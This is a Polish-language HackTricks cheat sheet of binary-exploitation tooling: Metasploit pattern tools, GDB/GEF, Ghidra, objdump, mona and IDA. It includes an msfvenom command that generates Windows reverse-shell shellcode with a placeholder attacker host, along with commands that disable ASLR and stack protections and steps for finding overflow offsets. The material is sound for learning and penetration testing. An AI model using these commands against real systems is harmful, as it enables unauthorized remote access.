<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## Shellkody

Shellkody są małymi fragmentami kodu, które są używane do wykorzystywania podatności w celu zdalnego wykonania kodu na zdalnym systemie. Shellkody są zwykle pisane w języku asemblera i są wstrzykiwane do programów lub systemów operacyjnych w celu uzyskania nieautoryzowanego dostępu.

### Rodzaje shellkodów

Istnieje wiele różnych rodzajów shellkodów, z których każdy ma swoje własne cechy i zastosowania. Oto kilka popularnych rodzajów shellkodów:

- **Bind shellkody**: Tworzą nasłuchujący port na zdalnym systemie, który pozwala na zdalne połączenie się z systemem i uzyskanie dostępu do powłoki systemowej.

- **Reverse shellkody**: Ustanawiają połączenie z atakującym, który nasłuchuje na określonym porcie. Połączenie to umożliwia atakującemu zdalne sterowanie zdalnym systemem i uzyskanie dostępu do powłoki systemowej.

- **Encoded shellkody**: Są to shellkody, które zostały przekształcone w inny format, aby uniknąć wykrycia przez systemy antywirusowe. Po dostarczeniu na celowy system, shellkod jest dekodowany i wykonany.

- **Polymorphic shellkody**: Są to shellkody, które są modyfikowane dynamicznie w celu uniknięcia wykrycia przez systemy antywirusowe. Każde wykonanie shellkodu jest nieco inne, co utrudnia wykrycie i analizę.

### Generowanie shellkodów

Istnieje wiele narzędzi dostępnych do generowania shellkodów, które mogą pomóc w tworzeniu własnych shellkodów. Oto kilka popularnych narzędzi:

- **Metasploit Framework**: Jest to potężne narzędzie do testowania penetracyjnego, które zawiera wiele modułów do generowania różnych rodzajów shellkodów.

- **msfvenom**: Jest to narzędzie wchodzące w skład Metasploit Framework, które umożliwia generowanie shellkodów w różnych formatach i dla różnych platform.

- **Shellcode Compiler**: Jest to narzędzie, które umożliwia kompilację shellkodów napisanych w języku C na wykonywalne pliki binarne.

### Wykorzystywanie shellkodów

Aby wykorzystać shellkod, należy znaleźć podatność w celowym systemie, która umożliwi wstrzyknięcie i wykonanie kodu. Następnie należy dostarczyć shellkod na celowy system i uruchomić go w celu uzyskania zdalnego dostępu.

Ważne jest, aby pamiętać, że wykorzystywanie shellkodów do nieautoryzowanego dostępu do systemów jest nielegalne i narusza prawa ochrony danych. Shellkody powinny być używane wyłącznie w celach testowania penetracyjnego lub w innych legalnych scenariuszach.
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## Instalacja

Aby zainstalować GDB, wykonaj następujące kroki:

### Linux

1. Otwórz terminal.
2. Wykonaj polecenie `sudo apt-get install gdb`, aby zainstalować GDB.

### macOS

1. Otwórz terminal.
2. Wykonaj polecenie `brew install gdb`, aby zainstalować GDB przy użyciu Homebrew.

### Windows

1. Pobierz GDB ze strony [https://www.gnu.org/software/gdb/](https://www.gnu.org/software/gdb/).
2. Uruchom instalator i postępuj zgodnie z instrukcjami, aby zainstalować GDB.

Po zakończeniu instalacji będziesz mógł korzystać z GDB do debugowania programów.
```
apt-get install gdb
```
## Parametry

**-q** --> Nie pokazuj banera\
**-x \<plik>** --> Automatycznie wykonaj instrukcje GDB z tego pliku\
**-p \<pid>** --> Podłącz do procesu

### Instrukcje

\> **disassemble main** --> Rozkładaj funkcję\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> Śledź utworzone procesy\
\> **p system** --> Znajdź adres funkcji system\
\> **help**\
\> **quit**

\> **br func**  --> Dodaj punkt przerwania do funkcji\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> Usuń określoną liczbę punktów przerwania\
\> **watch EXPRESSION** --> Przerwij, jeśli wartość się zmieni

**> run** --> Wykonaj\
**> start** --> Uruchom i przerwij w funkcji main\
\> **n/next** --> Wykonaj następną instrukcję (nie wewnątrz)\
\> **s/step** --> Wykonaj następną instrukcję\
\> **c/continue** --> Kontynuuj do następnego punktu przerwania

\> **set $eip = 0x12345678** --> Zmień wartość $eip\
\> **info functions** --> Informacje o funkcjach\
\> **info functions func** --> Informacje o funkcji\
\> **info registers** --> Wartość rejestrów\
\> **bt** --> Stos\
\> **bt full** --> Szczegółowy stos

\> **print zmienna**\
\> **print 0x87654321 - 0x12345678** --> Oblicz\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> Pokazuje zawartość w systemie ósemkowym/szesnastkowym/dziesiętnym/binarnym/instrukcji/ASCII

* **x/o 0xDir\_hex**
* **x/2x $eip** --> 2 słowa od EIP
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8 bajtów (b-> bajt, h-> 2 bajty, w-> 4 bajty, g-> 8 bajtów)
* **i r eip** --> Wartość $eip
* **x/w pointer** --> Wartość wskaźnika
* **x/s pointer** --> Łańcuch wskazywany przez wskaźnik
* **x/xw \&pointer** --> Adres, pod którym znajduje się wskaźnik
* **x/i $eip** —> Instrukcje EIP

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## Sztuczki

### Te same adresy w GDB

Podczas debugowania GDB będzie miał **nieco inne adresy niż te używane przez plik wykonywalny podczas uruchamiania**. Możesz sprawić, że GDB będzie miał te same adresy, wykonując następujące czynności:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<ścieżka>` _Wstaw bezwzględną ścieżkę do pliku wykonywalnego_
* Wykorzystaj plik wykonywalny, korzystając z tej samej bezwzględnej ścieżki
* `PWD` i `OLDPWD` muszą być takie same podczas korzystania z GDB i wykorzystywania pliku wykonywalnego

### Backtrace w celu znalezienia wywoływanych funkcji

Gdy masz **statycznie połączony plik wykonywalny**, wszystkie funkcje będą należeć do pliku wykonywalnego (a nie do zewnętrznych bibliotek). W tym przypadku może być trudne **zidentyfikowanie przepływu, którym podąża plik wykonywalny, aby na przykład poprosić o dane od użytkownika**.\
Możesz łatwo zidentyfikować ten przepływ, **uruchamiając** plik wykonywalny z **gdb**, aż zostaniesz poproszony o dane wejściowe. Następnie zatrzymaj go za pomocą **CTRL+C** i użyj polecenia **`bt`** (**backtrace**) w celu zobaczenia wywoływanych funkcji:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## Serwer GDB

`gdbserver --multi 0.0.0.0:23947` (w IDA musisz podać pełną ścieżkę do pliku wykonywalnego na maszynie Linux i na maszynie Windows)

# Ghidra

## Znajdowanie przesunięcia stosu

**Ghidra** jest bardzo przydatne do znalezienia **przesunięcia** dla **przepełnienia bufora dzięki informacjom o pozycji zmiennych lokalnych.**\
Na przykład, w poniższym przykładzie, przepełnienie bufora w `local_bc` wskazuje, że potrzebujesz przesunięcia `0xbc`. Ponadto, jeśli `local_10` to ciasteczko canary, wskazuje to, że aby nadpisać je z `local_bc`, istnieje przesunięcie `0xac`.\
_Pamiętaj, że pierwsze 0x08, od którego zapisywany jest RIP, należy do RBP._

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Kompiluj bez zabezpieczeń\
**-o** --> Wyjście\
**-g** --> Zapisz kod (GDB będzie w stanie go zobaczyć)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Wyłącz ASLR w systemie Linux

**Aby skompilować shellcode:**\
**nasm -f elf assembly.asm** --> zwraca ".o"\
**ld assembly.o -o shellcodeout** --> Wykonywalny plik

# Objdump

**-d** --> Rozkładaj sekcje wykonywalne (zobacz kody operacyjne skompilowanego shellcode, znajdź gadżety ROP, znajdź adres funkcji...)\
**-Mintel** --> Składnia **Intel**\
**-t** --> Tabela **symboli**\
**-D** --> Rozkładaj wszystko (adres zmiennej statycznej)\
**-s -j .dtors** --> Sekcja dtors\
**-s -j .got** --> Sekcja got\
\-D -s -j .plt --> Sekcja **plt** **zdekompilowana**\
**-TR** --> **Relokacje**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Adres "puts" do modyfikacji w GOT\
**objdump -D ./exec | grep "VAR\_NAME"** --> Adres lub zmienna statyczna (przechowywane w sekcji DATA).

# Core dumps

1. Uruchom `ulimit -c unlimited` przed uruchomieniem mojego programu
2. Uruchom `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=\<path/core> --quiet

# Więcej

**ldd executable | grep libc.so.6** --> Adres (jeśli ASLR, to zmienia się za każdym razem)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Pętla do sprawdzania, czy adres zmienia się dużo\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Przesunięcie "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Przesunięcie "/bin/sh"

**strace executable** --> Funkcje wywoływane przez wykonywalny plik\
**rabin2 -i ejecutable -->** Adres wszystkich funkcji

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## Debugowanie zdalne w systemie Linux

Wewnątrz folderu IDA znajdują się pliki binarne, które można użyć do debugowania binarnego pliku w systemie Linux. Aby to zrobić, przenieś plik _linux\_server_ lub _linux\_server64_ do serwera Linux i uruchom go wewnątrz folderu, który zawiera ten plik binarny:
```
./linux_server64 -Ppass
```
Następnie skonfiguruj debugger: Debugger (linux remote) --> Opcje procesu...:

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
